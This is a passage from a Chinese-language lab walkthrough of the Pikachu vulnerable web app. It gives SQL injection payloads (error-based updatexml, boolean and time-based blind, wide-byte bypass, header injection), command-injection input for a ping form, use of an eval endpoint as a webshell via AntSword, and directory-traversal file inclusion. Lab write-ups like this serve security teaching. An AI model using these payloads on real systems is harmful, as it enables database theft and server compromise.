<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">select username,id,email from member where username like &#x27;%$name%&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>构造闭合</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kobe%&#x27; or 1=1# //回显所有信息</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806155816877.png" alt="image-20230806155816877" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="insertupdate注入">insert/update注入<a href="#insertupdate注入" class="hash-link" aria-label="insert/update注入的直接链接" title="insert/update注入的直接链接">​</a></h3>
<p>后台语句</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806160254337.png" alt="image-20230806160254337" class="img_ev3q"></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;{$getdata[&#x27;username&#x27;]}&#x27;,md5(&#x27;{$getdata[&#x27;password&#x27;]}&#x27;),&#x27;{$getdata[&#x27;sex&#x27;]}&#x27;,&#x27;{$getdata[&#x27;phonenum&#x27;]}&#x27;,&#x27;{$getdata[&#x27;email&#x27;]}&#x27;,&#x27;{$getdata[&#x27;add&#x27;]}&#x27;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这个insert语句我们直接就在<code>住址(Add)</code>这个参数进行注入，闭合前面的sql只需要加入<code>&#x27;$payload)</code>(前后分别加入单引号和右括号)</p>
<p>我们利用updatexml()函数进行报错注入</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">111&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1))#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>concat是将符号与字符拼接在一起</p>
<p>0x7e是16进制,是这个符号<code>~</code></p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806162153532.png" alt="image-20230806162153532" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="delete注入">delete注入<a href="#delete注入" class="hash-link" aria-label="delete注入的直接链接" title="delete注入的直接链接">​</a></h3>
<p>后台语句</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806162335917.png" alt="image-20230806162335917" class="img_ev3q"></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">delete from message where id={$_GET[&#x27;id&#x27;]}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806162541721.png" alt="image-20230806162541721" class="img_ev3q"></p>
<p>这是数字型不需要进行闭合</p>
<p>其余跟insert注入是一样的</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="http-header-注入">http header 注入<a href="#http-header-注入" class="hash-link" aria-label="http header 注入的直接链接" title="http header 注入的直接链接">​</a></h3>
<p>以下是一些常见的请求header：</p>
<ol>
<li>
<p>Accept: 指定客户端能够接收的数据类型，例如text/html、image/jpeg等。</p>
</li>
<li>
<p>Accept-Encoding: 指定客户端能够接受的编码方式，例如gzip、deflate等。</p>
</li>
<li>
<p>Accept-Language: 指定客户端接受的语言类型，例如en-US，zh-CN等。</p>
</li>
<li>
<p>Connection: 指定客户端与服务器的连接类型，例如keep-alive、close等。</p>
</li>
<li>
<p>Host: 指定请求的服务器的域名和端口号。</p>
</li>
<li>
<p>User-Agent: 指定客户端使用的浏览器类型及版本号。</p>
</li>
</ol>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806163203127.png" alt="image-20230806163203127" class="img_ev3q"></p>
<p>后台语句</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806163236950.png" alt="image-20230806163236950" class="img_ev3q"></p>
<p>构造闭合</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1)--&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806164734474.png" alt="image-20230806164734474" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="基于boolian的盲注">基于boolian的盲注<a href="#基于boolian的盲注" class="hash-link" aria-label="基于boolian的盲注的直接链接" title="基于boolian的盲注的直接链接">​</a></h3>
<p>布尔盲注就是猜测，根据页面返回的true和flase猜数据库总数，猜数据库长度，猜数据库名字，猜表和字段</p>
<p>输入<code>kobe</code>用户存在，而输入<code>66</code>用户不存在，判断可能存在布尔盲注</p>
<p>我们可以猜与数据库的长度</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kobe&#x27; and length(database())=6# </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kobe&#x27; and length(database())=7# </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>当长度等于6时，提示用户不存在，等于7时，正确返回数据，说明数据库长度为7</p>
<p>我们再用burp爆破数据库的名称，构造payload</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kobe&#x27; and substr(database(),1,1)=&#x27;a&#x27;#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">substr()是截取字符串的函数</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>发送到爆破模块，设置位置</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171336783.png" alt="image-20230806171336783" class="img_ev3q"></p>
<p>第一个位置</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171418469.png" alt="image-20230806171418469" class="img_ev3q"></p>
<p>第二个位置</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171440400.png" alt="image-20230806171440400" class="img_ev3q"></p>
<p>按照顺序拼写出pikachu</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171519438.png" alt="image-20230806171519438" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="基于时间的盲注">基于时间的盲注<a href="#基于时间的盲注" class="hash-link" aria-label="基于时间的盲注的直接链接" title="基于时间的盲注的直接链接">​</a></h3>
<p>后台语句</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171713131.png" alt="image-20230806171713131" class="img_ev3q"></p>
<p>利用sleep()函数和返回时间进行判断是否存在时间盲注</p>
<p>正常输入，反应时间时15毫秒</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806172038838.png" alt="image-20230806172038838" class="img_ev3q"></p>
<p>构造payload</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kobe&#x27; and if(length(database())&gt;1,sleep(6),1)#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806172325802.png" alt="image-20230806172325802" class="img_ev3q"></p>
<p>花费了6秒，证明可能存在时间盲注</p>
<p>可判断数据库长度</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kobe&#x27; and if(length(database())&gt;6,sleep(6),1)# //执行了函数，延迟了6秒</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kobe&#x27; and if(length(database())&gt;7,sleep(6),1)# //没有执行延迟，证明长度是7</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>还可爆破数据库名称,跟布尔盲注是一样操作</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kobe&#x27; and if(substr(database(),1,1)=&#x27;p&#x27;,sleep(3),1)#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="宽字节注入wide-byte注入">宽字节注入(wide byte注入)<a href="#宽字节注入wide-byte注入" class="hash-link" aria-label="宽字节注入(wide byte注入)的直接链接" title="宽字节注入(wide byte注入)的直接链接">​</a></h3>
<p>一个字节的字符叫做窄字节，两个字节及以上叫宽字节</p>
<p>宽字节注入是绕过sql防御的一种方法，为了防御sql注入，一些函数可以将单引号、双引号进行转义，转义就是再单引号、双引号前面加上转义字符（\）。</p>
<p>mysql使用的是GBK编码（两个字节），<code>\</code>的十六进制编码是%5c，前面加%df就可以组成一个繁体字<code>運</code></p>
<p>过程：</p>
<p>id=1%df’（浏览器自动进行url编码%27）-&gt;%df%27
根据以上分析，发生如下转换：
%df%27—&gt;(check_addslashes)—&gt;%df%5c%27----&gt;(GBK)----&gt;運</p>
<p>最后单引号形成闭合</p>
<p>构造payload</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kobe%df&#x27; or 1=1# //回显所有信息</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806174819990.png" alt="image-20230806174819990" class="img_ev3q"></p>
<p>接着还可以判断字段数</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kobe%df&#x27; order by 2 //无报错</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kobe%df&#x27; order by 3 //有报错</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>联合查询进行查询数据库和版本</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kobe%df&#x27; union select database(),version() #</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806175239286.png" alt="image-20230806175239286" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="rce">RCE<a href="#rce" class="hash-link" aria-label="RCE的直接链接" title="RCE的直接链接">​</a></h2>
<p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="execping">exec“ping”<a href="#execping" class="hash-link" aria-label="exec“ping”的直接链接" title="exec“ping”的直接链接">​</a></h3>
<p>给了一个ping的框</p>
<p>尝试ping</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">127.0.0.1 &amp; whoami //两条命令都可以执行</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>同时执行多条命令的语法格式</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">a &amp; b   //先执行a再执行b，无论a是否执行成功(按位与)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">a &amp;&amp; b  //先执行a再执行b，只有a执行成功才会执行b(逻辑与)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">a || b  //先执行a再执行b，只有a执行失败才会执行b(逻辑或)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">a | b   //将a的执行结果传递给b(管道符)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="execevel">exec“evel”<a href="#execevel" class="hash-link" aria-label="exec“evel”的直接链接" title="exec“evel”的直接链接">​</a></h3>
<p>eval() 函数把字符串按照 PHP 代码来计算。</p>
<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
<p>可以输入<code>phpinfo();</code></p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806212321142.png" alt="image-20230806212321142" class="img_ev3q"></p>
<p>后端代码是直接可以执行的</p>
<p><code>eval($_POST[&#x27;txt&#x27;]</code>也算是一句话木马，我们可以通过蚁剑进行连接</p>
<p>这时候提示数据为空，是因为还有参数没有进行提交</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806213006470.png" alt="image-20230806213006470" class="img_ev3q"></p>
<p>我们添加一下</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806213211985.png" alt="image-20230806213211985" class="img_ev3q"></p>
<p>连接成功</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806213233214.png" alt="image-20230806213233214" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="文件包含漏洞">文件包含漏洞<a href="#文件包含漏洞" class="hash-link" aria-label="文件包含漏洞的直接链接" title="文件包含漏洞的直接链接">​</a></h2>
<p>首先，需要将服务器文件包含功能打开</p>
<p><img decoding="async" loading="lazy" src="C:/Users/86188/AppData/Roaming/Typora/typora-user-images/image-20230812153713038.png" alt="image-20230812153713038" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="本地文件包含">本地文件包含<a href="#本地文件包含" class="hash-link" aria-label="本地文件包含的直接链接" title="本地文件包含的直接链接">​</a></h3>
<p>只能够对服务器本地的文件进行包含，攻击者大多会读取系统配置文件等</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812152856968.png" alt="image-20230812152856968" class="img_ev3q"></p>
<p>通过目录遍历可以读取本地文件：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">../../1.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812153029599.png" alt="image-20230812153029599" class="img_ev3q"></p>
